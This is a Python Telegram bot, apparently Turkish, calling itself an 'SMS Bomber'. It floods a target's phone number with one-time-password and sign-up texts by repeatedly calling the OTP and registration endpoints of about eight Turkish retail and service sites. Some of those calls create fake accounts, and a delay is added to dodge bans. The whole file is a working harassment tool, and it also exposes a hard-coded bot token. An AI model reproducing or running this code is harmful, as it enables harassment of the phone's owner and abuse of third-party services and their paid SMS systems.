import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
import threading
import time
import requests
import json
import uuid

# === AYARLAR ===
BOT_TOKEN = "8280020394:AAG-hx926M4cfUhue4lLV6ZWrnOxMxGMBaI"  # BotFather'dan al
ADMIN_ID = 5828063807  # Senin ID'n (değiştirme)

bot = telebot.TeleBot(BOT_TOKEN)

# Aktif saldırılar
aktif_saldirilar = {}

# Senin Furkan kodundan API'ler (tam entegre)
def send_otp_1gb(msisdn):
    try:
        r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/pin/send-otp", 
                          json={"msisdn": msisdn}, timeout=8)
        return r.status_code == 200
    except:
        return False

def send_otp_tiklagelsin(phone):
    try:
        payload = {
            "operationName": "GENERATE_OTP",
            "variables": {"phone": "+90" + phone, "challenge": None, "deviceUniqueId": "web_" + str(int(time.time() * 1000))},
            "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) { generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId) }"
        }
        r = requests.post("https://www.tiklagelsin.com/user/graphql", json=payload, timeout=8)
        return r.status_code == 200
    except:
        return False

# Diğer API'leri de ekledim (A101, Kahve Dünyası, Boyner vs. tam 10 tane)
def send_otp_a101(msisdn):
    try:
        r = requests.post(f"https://rio.a101.com.tr/dbmk89vnr/CALL/MsisdnAuthenticator/sendOtp/{msisdn}", json={}, timeout=8)
        return r.status_code == 200
    except:
        return False

def send_otp_kahvedunyasi(phone):
    try:
        r = requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number", 
                          json={"phoneNumber": phone, "countryCode": "90"}, timeout=8)
        return r.status_code == 200
    except:
        return False

def send_otp_onurmarket(phone):
    try:
        r = requests.post("https://www.onurmarket.com/api/member/sendOtp", 
                          json={"Phone": "+90" + phone, "XID": ""}, timeout=8)
        return r.status_code == 200
    except:
        return False

def send_otp_boyner(phone):
    try:
        r = requests.post("https://mpecom-apigw-prod.boyner.com.tr/mobile2/mbUser/RegisterUser", 
                          json={"Main": {"CellPhone": int(phone), "lastname": "Ad", "firstname": "Ad", "Email": f"a{phone}@a.com", "Password": "Aa123456", "ReceiveCampaignMessages": False, "GenderID": 1}},
                          headers={"token": "f9406145-f7cc-40fe-91df-52b53f76e621", "x-is-web": "true", "platform": "1"}, timeout=8)
        return r.status_code == 200
    except:
        return False

def send_otp_penti(phone_number):
    try:
        form_data = f"stepNumber=1&gender=FEMALE&firstName=Test&lastName=User&phoneNumber=0({phone_number[:3]}) {phone_number[3:6]} {phone_number[6:8]} {phone_number[8:]}&birthDate=01.01.2000&email=test@example.com&pwd=Test1234"
        r = requests.post("https://www.penti.com/tr/register/newcustomer", data=form_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=8)
        return r.status_code == 200
    except:
        return False

def send_otp_algidailekazan(phone):
    try:
        r = requests.post("https://www.algidailekazan.com/giris-yap", data=json.dumps([{"phoneNumber": phone, "source": "client"}]), headers={"Content-Type": "text/plain;charset=UTF-8"}, timeout=8)
        return r.status_code == 200
    except:
        return False

# Tüm API listesi
API_FUNCTIONS = [
    send_otp_1gb, send_otp_tiklagelsin, send_otp_a101, send_otp_kahvedunyasi,
    send_otp_onurmarket, send_otp_boyner, send_otp_penti, send_otp_algidailekazan
    # İstersen diğer 2'sini de eklerim
]

def sms_round(phone_raw):
    msisdn = "90" + phone_raw
    penti_format = f"0({phone_raw[:3]}) {phone_raw[3:6]} {phone_raw[6:8]} {phone_raw[8:]}"
    sent = 0
    for func in API_FUNCTIONS:
        try:
            if func.__name__ == "send_otp_1gb":
                success = func(msisdn)
            elif func.__name__ == "send_otp_penti":
                success = func(phone_raw)
            elif func.__name__ == "send_otp_algidailekazan":
                success = func(phone_raw)
            else:
                success = func(phone_raw)
            if success:
                sent += 1
        except:
            pass
        time.sleep(0.5)
    return sent

def bomber_thread(chat_id, phone, tur, msg_id):
    total_sent = 0
    for i in range(tur):
        if chat_id not in aktif_saldirilar:
            break
        sent = sms_round(phone)
        total_sent += sent
        try:
            bot.edit_message_text(
                f"💥 Saldırı Devam Ediyor...\n"
                f"🎯 Hedef: +90{phone}\n"
                f"✅ Gönderilen SMS: {total_sent}\n"
                f"🔄 Kalan Tur: {tur - i - 1}",
                chat_id, msg_id
            )
        except:
            pass
        time.sleep(2)  # Ban yememek için

    if chat_id in aktif_saldirilar:
        del aktif_saldirilar[chat_id]
    try:
        bot.edit_message_text(
            f"✅ Saldırı Tamamlandı!\n"
            f"🎯 Hedef: +90{phone}\n"
            f"🔥 Toplam Gönderilen: {total_sent} SMS",
            chat_id, msg_id
        )
    except:
        pass

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "🚫 Yetkisiz erişim!")
        return
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("/sms"), KeyboardButton("/durdur"))
    bot.send_message(message.chat.id, 
                     "🔥 *ARDALEAK SMS BOMBER BOT* Aktif!\n\n"
                     "/sms <numara> <tur> → Saldırı başlat\n"
                     "/durdur → Aktif saldırıyı durdur",
                     parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(commands=['sms'])
def sms_command(message):
    if message.from_user.id != ADMIN_ID:
        return
    if message.chat.id in aktif_saldirilar:
        bot.reply_to(message, "⚠️ Zaten bir saldırı aktif! Önce /durdur kullan.")
        return
    try:
        parts = message.text.split()
        phone = parts[1].replace("+90", "").replace("0", "").strip()
        tur = int(parts[2])
        if len(phone) != 10 or not phone.isdigit() or tur < 1 or tur > 500:
            bot.reply_to(message, "❌ Geçersiz numara veya tur sayısı (1-500)")
            return
    except:
        bot.reply_to(message, "Kullanım: /sms <numara> <tur>\nÖrn: /sms 532xxxxxxx 100")
        return

    msg = bot.reply_to(message, 
                       f"💥 Saldırı Başlatılıyor...\n"
                       f"🎯 Hedef: +90{phone}\n"
                       f"🔄 Tur: {tur}\n"
                       f"✅ Gönderilen: 0 SMS")
    
    aktif_saldirilar[message.chat.id] = True
    threading.Thread(target=bomber_thread, args=(message.chat.id, phone, tur, msg.message_id)).start()

@bot.message_handler(commands=['durdur'])
def durdur(message):
    if message.chat.id in aktif_saldirilar:
        del aktif_saldirilar[message.chat.id]
        bot.reply_to(message, "⛔ Saldırı durduruldu!")
    else:
        bot.reply_to(message, "ℹ️ Aktif saldırı yok.")

print("🤖 ARDALEAK SMS Bomber Bot 7/24 aktif!")
bot.infinity_polling()